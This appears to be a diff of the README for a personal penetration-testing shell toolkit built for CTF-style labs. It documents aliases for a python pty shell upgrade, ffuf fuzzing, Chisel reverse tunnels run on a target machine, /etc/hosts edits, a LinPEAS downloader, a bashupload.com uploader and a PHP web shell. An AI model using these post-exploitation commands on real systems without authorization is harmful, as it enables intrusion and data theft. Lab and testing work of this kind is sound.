@@ -78,30 +78,16 @@ powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
 ```
 
 ## TTY upgrades
-### > py_tty_upgrade
-Copies the python(2) tty upgrade command to the clipboard. 
+### > uptty
+Copies the python(2) and python3 tty upgrade command to the clipboard. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
-└─$ py_tty_upgrade
+└─$ uptty
 ```
 Clipboard contents after:
 ```
-python -c 'import pty;pty.spawn("/bin/bash")'
-```
-> #### Notes
-> - Requires `xclip` to be installed
-
-### > py3_tty_upgrade
-Exactly the same as above but with python3. 
-Example: 
-```
-┌──(jazz㉿kali)-[~/jazz]
-└─$ py3_tty_upgrade 
-```
-Clipboard contents after:
-```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 > #### Notes
 > - Requires `xclip` to be installed
@@ -182,3 +168,101 @@ Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
 > #### Notes
 > - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.
 > - Uses `sudo` to get the privileges required for a UDP scan
+
+
+## SecLists Path
+
+> #### Notes
+> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:
+
+1. First, it checks if `/opt/seclists/` exists.
+2. If not, it checks if `/usr/share/seclists/` exists.
+3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.
+
+To set up SecLists for use with these scripts:
+
+1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).
+   
+   OR
+
+2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:
+
+   ```bash
+   export SECLISTS_PATH="/path/to/seclists"
+   # You can add this line to your .bashrc or .zshrc file to make it permanent.
+    ```
+
+## Web Fuzzing
+### > vhost $domain (-w wordlist) (extra arguments)
+Performs virtual host discovery using ffuf.
+Example:
+```
+┌──(22sh㉿kali)-[~]
+└─$ vhost box.htb
+```
+### > fuzz_dir $url (extra arguments)
+Performs directory and files fuzzing using ffuf.
+Exemple:
+```
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -fs 245
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
+```
+
+## Chisel Tunneling
+### > chisel_socks $ip $port
+Sets up a SOCKS proxy using Chisel and copy the command to the clipboard.
+Example:
+
+```
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_socks 10.10.14.10 8888
+[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
+2024/08/05 23:31:03 server: Reverse tunnelling enabled
+2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
+2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
+```
+### > chisel_forward $local_ip $local_port $remote_ip $remote_port
+Sets up port forwarding using Chisel.
+Example:
+
+```
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
+[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
+[+] Run this on the target machine
+2024/08/05 23:32:30 server: Reverse tunnelling enabled
+2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
+2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
+```
+## Host Management
+### > addhost $ip $hostname
+Adds or updates an entry in the /etc/hosts file.
+Example:
+```
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.234 big.box.htb 
+[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
+10.10.11.234 boss.htb big.boss.htb big.box.htb
+
+
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.235 newbox.htb 
+[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
+10.10.11.235 newbox.htb
+```
+
+
+## Additional Aliases
+- `linpeas`: Downloads the latest version of LinPEAS.
+- `upload`: Uploads a file using bashupload.com.
+- `phpcmd`: Creates a simple PHP web shell.
+- `burl`: curl using burpsuite proxy.
